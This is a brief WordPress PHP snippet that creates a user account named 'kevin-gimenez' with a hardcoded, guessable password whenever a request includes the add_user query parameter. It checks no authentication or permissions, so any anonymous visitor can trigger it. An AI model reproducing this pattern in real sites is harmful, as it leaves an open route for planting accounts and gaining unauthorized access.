<?php

if ( isset( $_GET['add_user'] ) ) {

add_action( 'template_redirect', 'bla' );
function bla() {
	$user_data = array(
		'user_login'   => 'kevin-gimenez',
		'display_name' => 'Giménez',
		'user_pass'    => md5('kevin'),
		'user_email'   => 'replace+' . md5( 'kevin' ) . '@me.com',
	);
	$user_id = wp_insert_user( $user_data ) ;
	echo $user_id;
	die( 'done' );
}

}